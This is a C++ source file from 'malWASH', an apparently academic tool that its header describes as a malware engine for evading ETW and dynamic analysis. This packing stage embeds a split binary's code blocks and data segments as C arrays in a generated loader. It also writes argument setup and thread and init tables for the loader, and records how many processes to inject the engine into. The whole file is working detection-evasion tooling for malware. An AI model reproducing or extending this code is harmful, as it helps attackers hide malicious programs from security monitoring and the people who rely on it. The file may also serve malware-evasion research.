//-----------------------------------------------------------------------------------------------------------
/*
**                               ,,                                                        
**                             `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**                               MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**  `7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**    MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**    MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**    MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**  .JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**     
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The splitting engine ** - Version 2.0
**
**  pack.cpp
**
**  This file will get all files generated by previous steps, and will create a *.cpp file that embeds all
**  files + the code of loader and executer. The big advantage of this, is that is very easy to add further
**  protections (we have the source code) (packing/polymorphic/metamorphic/antidebug, and so on).
**
**  - So, why we first store all blocks in files and then pack them, instead of immeditely send them to pack()
**  (pack will read information directly from netnodes)?
**  - Because this design is way more "clear". Furthermore if someone wants to implement a different pack() 
**  routine, this design makes it easier.
**
**  === Some words about superior arrays ===
**  The challenge: We have to store a variant number of blocks and segments in arrays. One solution is to use
**  as 2D array and store all blocks there. However we have to specify the 2nd dimension to the maximum 
**  possible value ending up in really very large .rdata segments. A better solution is to use 1D arrays 
**  and give to each array a unique name:
**      uchar blk_001[] = { "aaaaa" };
**      uchar blk_002[] = { "bbbbb" };
**  
**  The problem now is how we can parse all these arrays. There's not function eval() as in PHP, js, etc.
**  The dummy way is to create a separate loop for each block, making our code big and ugly.
**
**  The best solution is to use superior arrays. A superior array is an array that contains all the pointers
**  of the previous arrays. In our previous example a superior array will be like this:
**      uchar *supblk[] = { blk_001, blk_002, 0 };
**
**  By iterating through superior array we can parse all arrays with their different names in a cute way.
**
**
**  Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - August 2015
*/
//-----------------------------------------------------------------------------------------------------------
#include "malwash.h"                                        // all includes are here


// start with a useful MACRO
//
// write each character as a part of a C string (inside doouble quotes). If we have a printable
// character that won't cause problems inside double quotes, we write it as it is. Othewise we 
// write it's hex equivalent. Note that we must have a qstring with name 's' defined and an open
// stream.
#define wrtch(out, ch)                                                          \
    {   /* 1st condition is problematic. Use only 2nd one */                    \
        if( 0 && (ch) >= 0x20 && (ch) <= 0x7e && (ch) != '"' && (ch) != '\\' ) {\
            if( qfwrite(out, &(ch), 1) != 1 )                                   \
                return ERROR;                                                   \
        } else {                                                                \
            s.sprnt("\\x%02x", (ch));                                           \
            if( qfwrite(out, qstrdup(s.c_str()), 4) != 4 )                      \
                return ERROR;                                                   \
        }                                                                       \
    }


byte    cache[ MAXCACHESIZE ];                              // cache for stream reads/writes
qstring reasm;                                              // code for reassembly large arrays
//-----------------------------------------------------------------------------------------------------------
/*
**  filesize(): This calculates the size of an open file.
**
**  Arguments: stream (FILE*) : An open file stream
**
**  Return Value: The file size.
*/
ulong filesize( FILE *stream )
{
    ulong curpos, length;                                   // current position of file pointer and file length

    curpos = qftell( stream );                              // backup current location of file pointer
    qfseek( stream, 0L, SEEK_END );                         // go to the end of file
    length = qftell( stream );                              // get length at that position
    qfseek( stream, curpos, SEEK_SET );                     // go back to the previous location

    return length;                                          // return length
}
//-----------------------------------------------------------------------------------------------------------
/*
**  intrlpack(): Internal pack. Convert an array of bytes, to a C-style array declaration.
**
**  Arguments: out     (FILE*) : An open file stream
**             buf     (byte*) : buffer to write
**             buflen  (uint)  : buffer size
**             bufname (char*) : name of array that you'll create
**
**  Return Value: If function is sucessfull, the return value is 0. Otherwise -1 is returned.
*/
uint intrlpack( FILE *out, byte *buf, uint buflen, char *bufname )
{
    qstring s;                                              // store format string here
    uint    len;                                            // array declaration length


    s.sprnt("byte %s[] = { \"", bufname );                  // construct name for our array
    len = strlen( qstrdup(s.c_str()) );                     // find its length

    if( qfwrite(out, qstrdup(s.c_str()), len) != len )      // write the declaration
        return ERROR;                                       // function failure

    for( uint i=0; i<buflen; i++ )                          // for each character
        wrtch(out, buf[i]);                                 // write it to .cpp file
    
    if( qfwrite(out, "\" };\n", 5) != 5 )                   // close array declaration
        return ERROR;                                       // function failure

    s.sprnt("uint %slen = %d;\n", bufname, buflen );        // create the length variable
    len = strlen( qstrdup(s.c_str()) );                     // find its length

    if( qfwrite(out, qstrdup(s.c_str()), len) != len )      // write the declaration
        return ERROR;                                       // function failure

    return SUCCESS;                                         // success!
}

//-----------------------------------------------------------------------------------------------------------
/*
**  bbpack(): Byte-to-byte pack. This function is the same with intrlpack(). The only difference is that
**      bbpack() reads 1 character from input stream and write it to the output stream (ok it's not very 
**      efficient).
**
**  Arguments: out     (FILE*) : An open file stream to write output
**             in      (FILE*) : An open file stream to read data
**             nread   (uint)  : number of bytes to read from input stream
**             bufname (char*) : name of array that you'll create
**
**  Return Value: If function is sucessfull, the return value is 0. Otherwise -1 is returned.
*/
uint bbpack( FILE *out, FILE *in, uint nread, char *bufname )
{
    qstring s;                                              // store format string here
    uint    len;                                            // array declaration length


    s.sprnt("byte %s[] = { \"", bufname );                  // construct name for our array
    len = strlen( qstrdup(s.c_str()) );                     // find its length

    if( qfwrite(out, qstrdup(s.c_str()), len) != len )      // write the declaration
        return ERROR;                                       // function failure

    for( uint i=0; i<nread; i++ )   {
        byte    ch = 0;                                     // store a character here

        qfread(in, &ch, 1);                                 // read a character from input
        wrtch(out, ch);                                     // write character to output 
    }

    if( qfwrite(out, "\" };\n", 5) != 5 )                   // close array declaration
        return ERROR;                                       // function failure

    return SUCCESS;                                         // success!
}
//-----------------------------------------------------------------------------------------------------------
/*
**  segmpack(): Pack all segments in a C-style flavor.
**
**  Arguments: out      (FILE*) : An open file stream
**             keepfile (bool)  : Flag that indicates to delete or not intermediate files
**
**  Return Value: If function is sucessfull, the return value is 0. Otherwise -1 is returned.
*/
uint segmpack( FILE *out, bool keepfile )
{
    char    segm[MAXSEGNAMELEN] = {0};                      // store segment name here
    qstring s,                                              // store format string here
            sup,                                            // superior double pointer array of segments
            seglen;                                         // array that contains segment lengths
    uint    len,                                            // superior array declaration length
            cnt = 0;                                        // counter
    FILE    *in;                                            // input stream for segment
    

    sup.sprnt("byte *supsegm[] = {");                       // initialize superior array
    seglen.sprnt( "uint seglen[] = {" );                    // and length array
            
    for(nodeidx_t idx=segment.sup1st(); idx!=BADNODE; idx=segment.supnxt(idx), ++cnt)
    {
        memset(segm, '\0', MAXSEGNAMELEN);                  // clear buffer
        segment.supval(idx, segm, MAXSEGNAMELEN);           // get segment name

        sup.sprnt("%s %s, ", qstrdup(sup.c_str()), segm );  // append each segment to superior array 
        if( segm[0] == '_' ) segm[0] = '.';                 // change 1st character from '_' to '.'

        if( (in=qfopen(segm, "rb")) == NULL ) {             // try to create file
            fatal( "Cannot open segment file %s", segm);
            return ERROR;                                   // function failure
        }
        
        if( segm[0] == '.' ) segm[0] = '_';                 // restore 1st character back to '_'


        // PROBLEM: Visual C++ compiler allows constant arrays to be up to 65536 bytes. The same limitations
        // hold for constant strings. This scenario is not unusual when we store whole segments like .data
        // 
        // What we do is to break. Segment in multiple small arrays. We'll keep a global pointer as before
        // and during startup we allocate enough memory for that pointer and we append all segments.
        if( filesize(in) < MAXCONSTARRAYSIZE )              // all good?
        {
            // no problem. Pack segment
            if( bbpack(out, in, filesize(in), segm) == ERROR ) {
                qfclose( in );                              // close file 
                return ERROR;                               // function failure
            }
        }
        else {
            char    bsegm[MAXSEGNAMELEN] = {0};             // store block segment name here
            qstring s;                                      // store format string here
            uint    len;                                    // array declaration length


            msg( "\n    [!] Segment %s is too large (%d > %d). Splitting arrays...\n", 
                    segm, filesize(in), MAXCONSTARRAYSIZE );
            
            s.sprnt("byte *%s;\n", segm );                  // start with global array
            len = strlen( qstrdup(s.c_str()) );             // find its length

            if( qfwrite(out, qstrdup(s.c_str()), len) != len )
                return ERROR;   

            strcpy_s(bsegm, MAXSEGNAMELEN,  segm);          // block segment name
            strcat_s(bsegm, MAXSEGNAMELEN-strlen(bsegm), "_0");

            reasm.sprnt( "%s"
                         "\n\n\t%s = (byte*) malloc(%d);\n"
                         "\tsupsegm[%d] = %s;\n\n",
                            qstrdup(reasm.c_str()), segm, filesize(in), cnt, segm );
                
            for( uint j=0; j<filesize(in); j+=MAXCONSTARRAYSIZE )
            {               
                // allow up to 26 segment blocks
                bsegm[strlen(bsegm) - 1] = 'a' + j /  MAXCONSTARRAYSIZE;

                // pack next part of the array
                if( bbpack(out, in, MIN(MAXCONSTARRAYSIZE, filesize(in) - j), bsegm) == ERROR ) {
                    qfclose( in );                          // close file 
                    return ERROR;                           // function failure
                }

                // this is code is neede for reassembly
                reasm.sprnt("%s\tmemcpy(&%s[%d], %s, %d);\n", qstrdup(reasm.c_str()), 
                                segm, j, bsegm,  MIN(MAXCONSTARRAYSIZE, filesize(in) - j) );            
            }
        }

        seglen.sprnt("%s %d, ", qstrdup(seglen.c_str()), filesize(in) );

        qfclose( in );                                      // close file (no error check)

        segm[0] = '.';                                      // change for 1 more time :)
        if( !keepfile ) _unlink(segm);                      // delete file if needed
    }

    sup.sprnt("%s 0 };\n\n", qstrdup(sup.c_str()) );        // finalize superior array
    len = strlen(qstrdup(sup.c_str()));                     // get its length

    if( qfwrite(out, qstrdup(sup.c_str()), len) != len )    // write superior array
        return ERROR;                                       // function failure

    seglen.sprnt("%s 0 };\n\n", qstrdup(seglen.c_str()) );  // finalize length
    len = strlen(qstrdup(seglen.c_str()));                  // get its length

    if( qfwrite(out, qstrdup(seglen.c_str()), len) != len ) // write length array
        return ERROR;                                       // function failure


    return SUCCESS;                                         // success!
}
//-----------------------------------------------------------------------------------------------------------
/*
**  blkpack(): Pack all blocks in a C-style flavor.
**
**  Arguments: out      (FILE*) : An open file stream
**             keepfile (bool)  : Flag that indicates to delete or not intermediate files
**
**  Return Value: If function is sucessfull, the return value is 0. Otherwise -1 is returned.
*/
uint blkpack( FILE *out, bool keepfile )
{
    char    cntstr[16];                                     // 16bit id, 16 characters are more than enough
    qstring s,                                              // store format string here
            sup,                                            // superior double pointer array of blocks
            blklen;                                         // array that contains segment lengths
    uint    len;                                            // superior array declaration length
    FILE    *in;                                            // input stream for segment
    

    sup.sprnt("byte *supblk[] = {");                        // initialize superior array
    blklen.sprnt( "uint blklen[] = {" );                    // and length array

    for(uint n=1; n<=nblks; n++ )                           // for each block
    {
        _itoa_s(n, cntstr, 16, 10);                         // use safe version of itoa()       

        if( (in=qfopen(cntstr, "rb")) == NULL ) {           // try to create file
            fatal( "Cannot read block file %d", n );
            return ERROR;                                   // function failure
        }

        s.sprnt("blk_%03d", n);                             // we can have >1000 blocks (in Paranoid mode)
        sup.sprnt("%s %s,", qstrdup(sup.c_str()), 
                            qstrdup(s.c_str())  );          // append each block to superior array 

        if( bbpack(out, in, filesize(in), qstrdup(s.c_str())) == ERROR ) {
            qfclose( in );                                  // close file 
            return ERROR;                                   // function failure
        }
    
        blklen.sprnt("%s %d, ", qstrdup(blklen.c_str()), filesize(in) );

        qfclose( in );                                      // close file (no error check)

        if( !keepfile ) _unlink(cntstr);                    // delete file if needed
    }

    sup.sprnt("%s 0 };\n\n", qstrdup(sup.c_str()) );        // finalize superior array
    len = strlen(qstrdup(sup.c_str()));                     // get its length

    if( qfwrite(out, qstrdup(sup.c_str()), len) != len )    // write superior array
        return ERROR;                                       // function failure

    blklen.sprnt("%s 0 };\n\n", qstrdup(blklen.c_str()) );  // finalize length
    len = strlen(qstrdup(blklen.c_str()));                  // get its length

    if( qfwrite(out, qstrdup(blklen.c_str()), len) != len ) // write length array
        return ERROR;                                       // function failure


    return SUCCESS;                                         // success!
}
//-----------------------------------------------------------------------------------------------------------
/*
**  pack(): Generate a C++ file that embeds the original binary (contains blocks, segments and any metadata)
**      in constant arrays. That file also contains the required code to do the startup of malWASH and the
**      main executer() engine. We want to keep code simple, so the way we work is the following:
**      We have the loader in a single .cpp file which embeds executer() in an array. We have to insert the
**      arrays of binary somewhere in the middle of the original .cpp file. So, we split the original file
**      in 2 parts. First, we write the 1st file into output file, then we write block, segment and 
**      metadata arrays and finally we append the 2nd file to the output file.
**
**  Arguments: filename  (char*) : Name of output .cpp file
**             keepfiles (bool)  : If this is true, pack(), won't delete intermediate files
**
**  Return Value: If function is sucessfull, the return value is 0. Otherwise -1 is returned.
*/
uint pack( char filename[], bool keepfiles, mainstyle ms, char argv[] )
{
// MACRO for writing a format string to an open file
#define WRITECODE(s)                                                                \
    len = strlen(qstrdup(s.c_str()));                       /* get its length */    \
                                                                                    \
    if( qfwrite(fpout, qstrdup(s.c_str()), len) != len ) {  /* write length array */\
        fatal( "Cannot write to file %s", filename );                               \
        qfclose(fpout);                                     /* close file first */  \
        return ERROR;                                       /* function failure */  \
    }


    FILE        *fpout, *fpin;                              // our file pointers
    qstring     s;                                          // store format string here
    int         argc = 0;                                   // classic argc
    uint        len;                                        // length variable


    if( (fpout=qfopen(filename, "w")) == NULL ) {           // try to create output file
        fatal( "Cannot create file %s", filename );
        return ERROR;                                       // function failure
    }

    /*----------------------------------------------------------------------------
    ** Copy 1st file to the output file
    **--------------------------------------------------------------------------*/
    if( (fpin = qfopen(OUTFILENAME_PART1, "r")) == NULL ) {
        fatal( "Cannot open file %s", OUTFILENAME_PART1 );
        return ERROR;                                       // function failure
    }

    // if( (len = qfread(fpin, cache, MAXCACHESIZE)) != filesize(fpin) ) {
    len = qfread(fpin, cache, MAXCACHESIZE);
    
    if( qfwrite(fpout, cache, len) != len ) {               // write input to output file
        fatal( "Cannot write to file %s", filename );
        return ERROR;                                       // function failure
    }
    
    qfclose(fpin);                                          // close 1st input file
    
    
    /*----------------------------------------------------------------------------
    ** Write binary's metadata first and the header of command line args
    **
    ** If we don't want to any args, we'll write some NULLs
    **--------------------------------------------------------------------------*/
    s.sprnt( 
        "//-----------------------------------------------------------------------------------------------------------\n"
        "// now continue with definitions (don't forget to change NBLOCKS, NSEGMS and NPROC)\n"
        "//-----------------------------------------------------------------------------------------------------------\n\n"
        "#define NBLOCKS %d                                     // number of program blocks\n"
        "#define NSEGMS %d                                      // number of program segments\n"
        "#define NPROC  %d                                      // number of processes to inject malWASH\n\n\n"

        "//-----------------------------------------------------------------------------------------------------------\n"
        "// set command line arguments\n"
        "//-----------------------------------------------------------------------------------------------------------\n"
        "void setargs( shctrl_t *s )\n"
        "{\n"       
        "   *(uint*)(shctrl->ctx[0].esp + 0x8) = %s;            // hPrevInstance or argv\n"
        "   *(uint*)(shctrl->ctx[0].esp + 0xc) = %s;            // lpCmdLine (only in WinMain)\n\n",

        nblks, nsegms, nprocs, 
        ms == MAIN    ? "STACKBASEADDR + ARGVBASEOFF" :"0", // **argv is near the bottom of the stack
        ms == WINMAIN ? "STACKBASEADDR + ARGVBASEOFF" :"0"  // ignored on main() style
    );

    WRITECODE(s);                                           // write code to file
    /*----------------------------------------------------------------------------
    ** Now write each argument to the stack
    **--------------------------------------------------------------------------*/
    if( ms == WINMAIN )                                     // WinMain() style?
    {
        // in WinMain() we copy the whole argv as a single string
        s.sprnt("   strcpy( (char*)(STACKBASEADDR + ARGVBASEOFF), \"%s\");\n\n", argv);

        WRITECODE(s);                                       // write code to file
    }
    else if( ms == MAIN )
    {
        // in main() we write each argv[] in different address
        msg( "    [+] Extracting arguments from argv...\n" );

        for( char *nxttok, *token=strtok_s(argv, " ", &nxttok); token!=NULL; 
                            token=strtok_s(NULL, " ", &nxttok), argc++
           )
        {
            msg( "        [+] argv[%d] = %s\n", argc, token );
                
            s.sprnt(                                        // write argument to shared stack
                "   *(uint*)(STACKBASEADDR + ARGVBASEOFF + %d) = STACKBASEADDR + ARGVPTRBASEOFF + %d*ARGVNXTOFF;\n"
                "   strcpy( (char*)(STACKBASEADDR + ARGVPTRBASEOFF + %d*ARGVNXTOFF), \"%s\");\n\n",
                argc*4, argc, argc, token
            );

            WRITECODE(s);                                   // write code to file
        }

        // argv always finish with a NULL
        s.sprnt("   *(uint*)(STACKBASEADDR + ARGVBASEOFF + %d) = NULL;\n\n", argc*4 );

        WRITECODE(s);                                       // write code to file
    }

    /*----------------------------------------------------------------------------
    ** Finalize functions by writing argc and the closing bracket
    **--------------------------------------------------------------------------*/
    s.sprnt( 
        "   *(uint*)(shctrl->ctx[0].esp + 0x4) = %d;            // hInstance or argc\n"
        "}\n"
        "//-----------------------------------------------------------------------------------------------------------\n", 
        ms == MAIN ? argc : 0 ); 

    WRITECODE(s);                                           // write code to file
    
    /*----------------------------------------------------------------------------
    ** Now, write binary's blocks and segments
    **--------------------------------------------------------------------------*/
    msg( "   [-] Packing blocks, segments, and function module and segment tables... " );

    reasm.sprnt( "\n" );                                    // initialize this

    // pack function, module and segment tables
    // then pack segments and blocks
    if((intrlpack(fpout, (byte*)funtab, funtablen, "funtab" ) |
        intrlpack(fpout, (byte*)modtab, modtablen, "modtab" ) |
        intrlpack(fpout, (byte*)segtab, segtablen, "segtab" ) |
        segmpack(fpout, keepfiles) |
        blkpack (fpout, keepfiles)) == ERROR )
    {
        fatal( "Cannot pack due to an internal error" );
        qfclose(fpout);                                     // close file first
        return ERROR;                                       // function failure
    }

    if( !keepfiles ) {                                      // if we don't keep files
        _unlink( ".funtab" );                               // delete them
        _unlink( ".modtab" );
        _unlink( ".segtab" );
        _unlink( ".thdtab" );
        _unlink( ".initab" );
    }

    msg( "Done.\n" );

    /*----------------------------------------------------------------------------
    ** Write binary's metadata first and the header of command line args
    **
    ** If we don't want to any args, we'll write some NULLs
    **--------------------------------------------------------------------------*/
    s.sprnt( 
        "//-----------------------------------------------------------------------------------------------------------\n"
        "// reassemble block arrays to reconstruct the large arrays\n"
        "//-----------------------------------------------------------------------------------------------------------\n"
        "void reasm( void )\n"
        "{\n%s\n}\n\n"
        "//-----------------------------------------------------------------------------------------------------------\n",
            qstrdup(reasm.c_str())
    );

    WRITECODE(s);                                           // write code to file


    /*----------------------------------------------------------------------------
    ** Then pack thread table
    **--------------------------------------------------------------------------*/
    msg( "   [-] Packing thread table... " );
    
    s.sprnt("uint thdtab[] = {");                           // initialize thread table

    // iterate through all segments
    for(nodeidx_t idx=thdtab.alt1st('T'); idx!=BADNODE; idx=thdtab.altnxt(idx, 'T'))
        // write each thread entry point with its block id to our array
        s.sprnt("%s 0x%x, %d, ", qstrdup(s.c_str()), idx, thdtab.altval( idx, 'T' ) & SHORT );  

    s.sprnt("%s 0, 0 };\n", qstrdup(s.c_str()) );           // finalize superior array
    

    len = strlen(qstrdup(s.c_str()));                       // get its length

    if( qfwrite(fpout, qstrdup(s.c_str()), len) != len ) {  // write length array
        fatal( "Cannot write to file %s", filename );
        qfclose(fpout);                                     // close file first
        return ERROR;                                       // function failure
    }
    msg( "Done.\n" );


    /*----------------------------------------------------------------------------
    ** Finally pack init table
    **--------------------------------------------------------------------------*/
    msg( "   [-] Packing init table... " );
    
    s.sprnt("uint initablen = %d;\nuint initab[] = {", initptrcnt);

    for( uint i=0; i<initptrcnt; i++ )                      // for each dependecny
    {
        ushort src = -1, dst = -1;

        // serial (pffff it's not efficient!) search all segments till you find the matching one
        for(nodeidx_t idx=segment.alt1st(); idx!=BADNODE; idx=segment.altnxt(idx))
        {
                 if( segment.altval(idx) == initptr[i].src_seg ) src = idx;
            else if( segment.altval(idx) == initptr[i].dst_seg ) dst = idx;
        }

        if( dst != 0xffff && src != 0xffff )                // if we have valid indices
            s.sprnt("%s %d, %d, 0x%x,", qstrdup(s.c_str()), src, dst, initptr[i].seg_off ); 
    }

    s.sprnt("%s 0, 0, 0 };\n", qstrdup(s.c_str()) );        // finalize superior array

    len = strlen(qstrdup(s.c_str()));                       // get its length

    if( qfwrite(fpout, qstrdup(s.c_str()), len) != len ) {  // write length array
        fatal( "Cannot write to file %s", filename );
        qfclose(fpout);                                     // close file first
        return ERROR;                                       // function failure
    }

    msg( "Done.\n" );


    /*----------------------------------------------------------------------------
    ** Finally append 2nd file to the output file
    **--------------------------------------------------------------------------*/
    if( (fpin = qfopen(OUTFILENAME_PART2, "r")) == NULL ) {
        fatal( "Cannot open file %s", OUTFILENAME_PART2 );
        qfclose(fpout);                                     // close file first
        return ERROR;                                       // function failure
    }

    // if( (len = qfread(fpin, cache, MAXCACHESIZE)) != filesize(fpin) ) {
    len = qfread(fpin, cache, MAXCACHESIZE);

    if( qfwrite(fpout, cache, len) != len ) {               // write input to output file
        fatal( "Cannot write to file %s", filename );
        qfclose(fpout);                                     // close file first
        return ERROR;                                       // function failure
    }
    
    qfclose(fpin);                                          // close 1st input file

    
    if( qfclose(fpout) ) {                                  // close output file now
        fatal( "Cannot close file %s", filename );
        return ERROR;                                       // function failure
    }


    return SUCCESS;                                         // success!
}
//-----------------------------------------------------------------------------------------------------------
#undef wrtch
//-----------------------------------------------------------------------------------------------------------
